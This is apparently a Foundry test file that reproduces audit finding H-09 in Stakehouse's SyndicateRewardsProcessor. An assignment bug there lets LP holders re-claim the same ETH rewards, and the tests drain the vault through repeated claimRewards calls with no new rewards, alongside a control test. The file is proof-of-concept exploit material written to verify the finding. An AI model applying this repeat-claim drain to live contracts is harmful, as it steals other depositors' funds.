// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43032-h-09-incorrect-accounting-in-syndicaterewardsprocessor-resul.sol";

/*//////////////////////////////////////////////////////////////
    Stakehouse Protocol — incorrect accounting in SyndicateRewardsProcessor
    results in any LP token holder being able to steal other LP token
    holders' ETH from the fees and MEV vault (H-09, #43032)

    _distributeETHRewardsToUserForToken does `claimed[_user][_token] = due`
    instead of `+= due`. After the first claim this happens to be correct
    (claimed started at 0), but every claim AFTER that discards the record of
    what was already paid, so the SAME due amount can be re-extracted by
    calling claimRewards again — even with no new rewards.

    - test_exploit: drives the cheatcode-free Exploit end to end (two
      depositors, two reward rounds, two legitimate claims — all pre-set-up
      like vm.deal/prior activity), then re-asserts the illegitimate THIRD
      claim's theft from the driver.
    - test_repeatedClaimDrainsVault: standalone rebuild mirroring the
      finding's own PoC shape (repeated claimRewards calls with no new
      rewards keep paying out).
    - test_control_singleClaimIsFair: control — a single claim (no repeat)
      pays exactly the correct amount and further claims with no new reward
      pay zero, isolating the repeat-claim ledger corruption as the defect.
//////////////////////////////////////////////////////////////*/
contract SyndicateRewardsRepeatClaimTest is Test {
    /// @notice HARM via the self-contained Exploit: userA's third claim call
    ///         extracts ETH despite zero new rewards since the second claim.
    function test_exploit() public {
        Exploit e = new Exploit();
        Depositor userA = e.userA();
        Depositor userB = e.userB();
        GiantMevAndFeesPool pool = e.pool();
        uint256 depositAmount = e.DEPOSIT_AMOUNT();
        uint256 rewardRound = e.REWARD_ROUND();

        // Pre-fund depositors (mirrors vm.deal, done before run()).
        vm.deal(address(userA), depositAmount);
        vm.deal(address(userB), depositAmount);
        userA.deposit(pool, depositAmount);
        userB.deposit(pool, depositAmount);

        // Round 1: reward arrives, userA claims legitimately.
        vm.deal(address(pool), address(pool).balance + rewardRound);
        userA.claim(pool, address(userA));
        assertEq(userA.totalReceived(), 0.6 ether, "round 1 legitimate claim");

        // Round 2: reward arrives, userA claims legitimately again.
        vm.deal(address(pool), address(pool).balance + rewardRound);
        userA.claim(pool, address(userA));
        assertEq(userA.totalReceived(), 1.2 ether, "round 2 legitimate claim");

        // === attack (inside e.run()): userA claims a THIRD time, no new reward ===
        e.run();

        // Re-assert the HARM independently from the driver.
        assertEq(userA.totalReceived(), 1.8 ether, "userA extracted 0.6 ETH beyond their two legitimate claims");
        uint256 fairShare = pool.totalETHSeen() / 2; // userA holds exactly half the LP supply
        assertEq(fairShare, 1.2 ether, "sanity: fair share is half of the 2.4 ETH total rewards seen");
        assertGt(userA.totalReceived(), fairShare, "userA alone extracted MORE than their fair share of total rewards");
        assertEq(userB.totalReceived(), 0, "userB never claimed, yet is now shorted");
    }

    /// @notice Standalone rebuild mirroring the finding's own PoC shape
    ///         (two reward rounds, repeated claims): once a SECOND reward
    ///         round is claimed, the ledger corruption lets accountOne keep
    ///         re-claiming the same `due` with no further new rewards,
    ///         draining the vault at accountTwo's expense.
    function test_repeatedClaimDrainsVault() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        Depositor accountOne = new Depositor();
        Depositor accountTwo = new Depositor();

        vm.deal(address(accountOne), 2 ether);
        vm.deal(address(accountTwo), 2 ether);
        accountOne.deposit(pool, 2 ether);
        accountTwo.deposit(pool, 2 ether);

        // Reward round 1: 1.2 ether lands in the vault; accountOne claims
        // legitimately (the FIRST claim is always correct — claimed[] starts
        // at 0, so `=` and `+=` agree).
        vm.deal(address(pool), address(pool).balance + 1.2 ether);
        accountOne.claim(pool, address(accountOne));
        assertEq(accountOne.totalReceived(), 0.6 ether, "round 1 legitimate claim");

        // Reward round 2: another 1.2 ether lands; accountOne claims again —
        // this SECOND claim's `claimed[]= due` (instead of `+=`) discards the
        // record of round 1's payout.
        vm.deal(address(pool), address(pool).balance + 1.2 ether);
        accountOne.claim(pool, address(accountOne));
        assertEq(accountOne.totalReceived(), 1.2 ether, "round 2 legitimate claim");

        // Now claiming AGAIN with NO new reward still pays out (the bug) —
        // and keeps paying every time it's called.
        accountOne.claim(pool, address(accountOne));
        accountOne.claim(pool, address(accountOne));
        accountOne.claim(pool, address(accountOne));

        assertEq(accountOne.totalReceived(), 3.0 ether, "accountOne drained far more than its 1.2 ETH fair share");
        assertEq(accountTwo.totalReceived(), 0, "accountTwo never claimed anything");
    }

    /// @notice Control: a SINGLE claim pays exactly the correct amount, and a
    ///         second claim with NO new reward pays exactly zero — isolating
    ///         the repeat-claim ledger corruption (claimed[]= vs +=) as the
    ///         defect, not claimRewards or the accrual math in general.
    function test_control_singleClaimIsFair() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        Depositor solo = new Depositor();

        vm.deal(address(solo), 2 ether);
        solo.deposit(pool, 2 ether);

        vm.deal(address(pool), address(pool).balance + 1 ether);

        solo.claim(pool, address(solo));
        assertEq(solo.totalReceived(), 1 ether, "sole holder claims the full reward once");

        // A second claim with NO new reward pays nothing — no repeat-claim
        // exploitation possible when the FIRST claim's ledger update is
        // still consistent with a from-zero baseline.
        uint256 before = solo.totalReceived();
        solo.claim(pool, address(solo));
        assertEq(solo.totalReceived(), before, "second claim with no new reward pays exactly zero, no bug fires yet");
    }
}
